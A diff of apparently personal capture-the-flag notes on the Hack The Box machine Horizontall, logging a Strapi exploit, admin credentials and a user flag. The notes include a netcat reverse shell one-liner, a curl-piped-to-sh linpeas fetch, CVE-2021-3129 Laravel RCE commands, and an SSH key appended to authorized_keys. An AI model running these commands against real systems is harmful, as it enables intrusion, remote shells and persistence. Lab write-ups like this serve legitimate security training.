@@ -45,36 +45,65 @@ After running exploit.py, shell becomes broken. see ![broken shell](Screenshots/
  + Now login with credentials:: admin:SuperStrongPassword1 see ![creds](Screenshots/strapi_exploit_broken_shell.png)
  + File upload present in admin portal.
    + try to upload reverse shell::
-   1)`$> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.3 1337 >/tmp/f` see ![Shell](Screenshots/strapi_shell.png)
-   2) `nc -lnvp <lister port> :: $whoami strapi` 
-   3) /home/developer/user.txt
+ `victim -$> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.8 5555 >/tmp/f` see ![Shell](Screenshots/strapi_shell.png)
+ `attack -$ nc -lnvp <lister port> :: $whoami strapi` 
+ `attack -$ cat /home/developer/user.txt :: e0a070503b5ecb060d4ec125c811270b`
 
 ---
-Root::
+**Root::**
 + netstat shows ports && ips
 + sudo -l nothing, very low permissions.
 + find / -perm /6000
-  + GTFO's: 
+  + GTFO's: No luck
+  + netstat -nutpl :: 
+  + 8000 - curl: Laravel v8 (PHP v7.4.18)
+  + 3306 - mysql
+  + 22 - ssh
+  + 1337 - "welcome to your api - Welcome."
 
+##**Linpeas.sh::**##
+```
 + python -m http.server 8081
 + curl <attack tun ip>:8081/linpeas.sh | sh
     + see ![horizontal_ports](Screenshots/linpeas_ports_horizontall.png)
-```
-UN:PW for mysql (from linpeas.sh): developer:#J!:F9Zt2u
-SSH keys avaliable : /opt/strapi/myapi/node_modules/..etc.etc
+
+UN:PW for mysql (from linpeas.sh): developer:#J!:F9Zt2u :: No luck
+SSH keys avaliable : /opt/strapi/myapi/node_modules/..etc.etc No luck
 sudo verison 1.8.21p2
 curl 127.0.0.1:8000 ::
     + https://vapor.laravel.com
-    + see link laravel_exploit
-    exploit: CVE-2021-3129_exploit
+    + see link laravel_exploit(2)
+    exploit: CVE-2021-3129_exploit || laravel-igition-rce
 ```
-TODO::
-import requests:
-no module requests available 
+
+##**CVE-2021-3129 - laravel-igition-rce**##
+serve file: `$ python -m http.server 8080`
+attacker  ` $ cd tmp/ && wget http://<attack-ip>:8080/laravelexploit.py laravelexploit.py`
+`chmod +x laravelexploit.py`
+`$ php -d\'phar.readonly=0\' ./phpggc --phar phar -f -o /tmp/exploit.phar monolog/rce1 system id\n`
+`$ ./laravelexlpoit.py http://127.0.0.1:8000 path/to/exploit.phar`
+Does NOT WORK:: 
+
+##**SSH::**##
+```
+ssh-keygen -t rsa -C "random comment"
+cat id_rsa.pub >> authorized_keys
+ssh -L 8000:127.0.0.1:8000 strapi@10.10.11.105 :: SUCCESS
+```
+^^now in SSH^^: Always killed.
+
+BROKEN BOX
+
+CONTACT HTB
+
+
+
+
 
 ---
-**References::
+**References::**
 [Discovery_DNS_subdomains_etc](https://github.com/danielmiessler/SecLists)
 [Linpeas.sh](https://github.com/carlospolop/PEASS-ng/releases/tag/refs/pull/252/merge)
 [Lavarel_exploit](https://github.com/nth347/CVE-2021-3129_exploit)
+[lavarel_exploit2](https://github.com/ambionics/laravel-exploits/blob/main/laravel-ignition-rce.py)
 [walkthrough](https://burakozlu.medium.com/horizontall-walkthrough-htb-250182ab0721)
